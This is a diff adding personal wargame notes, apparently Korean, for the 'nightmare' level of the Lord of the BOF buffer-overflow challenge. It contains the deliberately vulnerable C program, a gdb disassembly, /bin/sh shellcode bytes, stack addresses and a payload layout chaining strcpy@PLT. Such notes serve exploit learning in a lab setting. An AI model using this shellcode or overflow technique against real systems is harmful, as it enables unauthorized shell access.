@@ -1,0 +1,131 @@
+succubus
+here to stay
+
+[succubus@localhost succubus]$ cat nightmare.c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - nightmare
+        - PLT
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dumpcode.h>
+
+main(int argc, char *argv[])
+{
+        char buffer[40];
+        char *addr;
+
+        if(argc < 2){
+                printf("argv error\n");
+                exit(0);
+        }
+
+        // check address
+        addr = (char *)&strcpy;
+        if(memcmp(argv[1]+44, &addr, 4) != 0){
+                printf("You must fall in love with strcpy()\n");
+                exit(0);
+        }
+
+        // overflow!
+        strcpy(buffer, argv[1]);
+        printf("%s\n", buffer);
+
+        // dangerous waterfall
+        memset(buffer+40+8, 'A', 4);
+}
+
+-------------------------------------------------------------------
+
+(gdb) disas main
+Dump of assembler code for function main:
+0x80486b4 <main>:       push   %ebp
+0x80486b5 <main+1>:     mov    %ebp,%esp
+0x80486b7 <main+3>:     sub    %esp,44
+0x80486ba <main+6>:     cmp    DWORD PTR [%ebp+8],1
+0x80486be <main+10>:    jg     0x80486d7 <main+35>
+0x80486c0 <main+12>:    push   0x80487db
+0x80486c5 <main+17>:    call   0x80483e0 <printf>
+0x80486ca <main+22>:    add    %esp,4
+0x80486cd <main+25>:    push   0
+0x80486cf <main+27>:    call   0x80483f0 <exit>
+0x80486d4 <main+32>:    add    %esp,4
+0x80486d7 <main+35>:    mov    DWORD PTR [%ebp-44],0x8048410
+0x80486de <main+42>:    push   4
+0x80486e0 <main+44>:    lea    %eax,[%ebp-44]
+0x80486e3 <main+47>:    push   %eax
+0x80486e4 <main+48>:    mov    %eax,DWORD PTR [%ebp+12]
+0x80486e7 <main+51>:    add    %eax,4
+0x80486ea <main+54>:    mov    %edx,DWORD PTR [%eax]
+0x80486ec <main+56>:    add    %edx,44
+0x80486ef <main+59>:    push   %edx
+0x80486f0 <main+60>:    call   0x80483c0 <memcmp>
+0x80486f5 <main+65>:    add    %esp,12
+0x80486f8 <main+68>:    mov    %eax,%eax
+0x80486fa <main+70>:    test   %eax,%eax
+0x80486fc <main+72>:    je     0x8048715 <main+97>
+0x80486fe <main+74>:    push   0x8048800
+0x8048703 <main+79>:    call   0x80483e0 <printf>
+0x8048708 <main+84>:    add    %esp,4
+0x804870b <main+87>:    push   0
+0x804870d <main+89>:    call   0x80483f0 <exit>
+0x8048712 <main+94>:    add    %esp,4
+0x8048715 <main+97>:    mov    %eax,DWORD PTR [%ebp+12]
+0x8048718 <main+100>:   add    %eax,4
+0x804871b <main+103>:   mov    %edx,DWORD PTR [%eax]
+0x804871d <main+105>:   push   %edx
+0x804871e <main+106>:   lea    %eax,[%ebp-40]
+0x8048721 <main+109>:   push   %eax
+0x8048722 <main+110>:   call   0x8048410 <strcpy>
+0x8048727 <main+115>:   add    %esp,8
+0x804872a <main+118>:   lea    %eax,[%ebp-40]
+0x804872d <main+121>:   push   %eax
+0x804872e <main+122>:   push   0x8048825
+0x8048733 <main+127>:   call   0x80483e0 <printf>
+0x8048738 <main+132>:   add    %esp,8
+0x804873b <main+135>:   push   4
+0x804873d <main+137>:   push   65
+0x804873f <main+139>:   lea    %eax,[%ebp-40]
+0x8048742 <main+142>:   lea    %edx,[%eax+48]
+0x8048745 <main+145>:   push   %edx
+0x8048746 <main+146>:   call   0x8048400 <memset>
+0x804874b <main+151>:   add    %esp,12
+0x804874e <main+154>:   leave
+0x804874f <main+155>:   ret
+
+[페이로드 구상]
+쉘:
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+<strcpy>주소:
+0x8048722 <main+110>:   call   0x8048410 <strcpy>
+
+&buffer :
+0xbffffa70
+
+&(buffer+48) :
+0xbffffaa0
+
+SHELL2 (쉘코드):
+0xbffffca5
+
+SHELL3 (&SHELL2):
+0xbffffcc5
+
+SHELL4 (쉘 +NOP):
+-
+
+-------------------------
+buffer's addr : bffffac0
+buffer + 48's addr : bffffaf0
+--------------------------
+
+&쉘코드[4] + 쉘코드[24]+ dummy[16] + &<strcpy @PLT>[4] + dummy[4] + &(strcpy's RET)[4] + &buffer[4]
+
+leave	mov esp ebp
+	pop ebp
+ret	pop eip
+	jmp eip
